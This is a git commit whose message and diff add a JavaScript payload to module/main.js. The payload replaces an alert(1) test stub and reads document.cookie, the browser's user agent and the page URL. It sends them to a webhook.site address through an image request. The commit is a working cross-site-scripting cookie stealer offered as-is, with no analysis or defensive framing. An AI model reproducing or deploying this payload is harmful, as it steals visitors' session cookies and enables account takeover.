adfef8fdb87e31abcdb965bbcc8425b59fb627ac
leosycthe <142280820+muhammadrayhanwidayat@users.noreply.github.com>
2025-11-25 17:03:48 +0700

    Implement cookie and user agent leak functionality
    Added a function to leak cookies and user agent to a webhook.

--- module/main.js
+++ module/main.js
@@ -1,1 +1,8 @@
-(() => { alert(1); })();
+(() => {
+  const hook = 'https://webhook.site/f17cb942-847b-49ab-9d9b-11e818602e8b';
+  const leak = (data) => {
+    const i = new Image();
+    i.src = hook + '?u=' + encodeURIComponent(location.href) + '&d=' + encodeURIComponent(data);
+  };
+  leak('cookie=' + document.cookie + '; ua=' + navigator.userAgent);
+})();
